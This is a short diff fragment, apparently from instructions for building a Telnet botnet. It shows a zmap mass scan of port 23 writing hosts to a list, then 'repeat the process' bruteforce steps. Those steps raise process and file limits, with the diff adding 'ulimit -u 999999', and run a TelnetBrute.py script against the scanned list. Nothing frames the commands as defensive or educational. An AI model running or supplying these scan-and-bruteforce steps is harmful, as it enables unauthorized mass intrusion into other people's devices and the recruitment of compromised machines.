@@ -12,7 +12,7 @@ zmap -p23 -o mfu.txt -N 50000
 
 - Bruteforce (Repeat The Process)
 
-1- ulimit -n 999999
+1- ulimit -n 999999; ulimit -u 999999
 
 2- python TelnetBrute.py mfu.txt 15000 test.txt
 
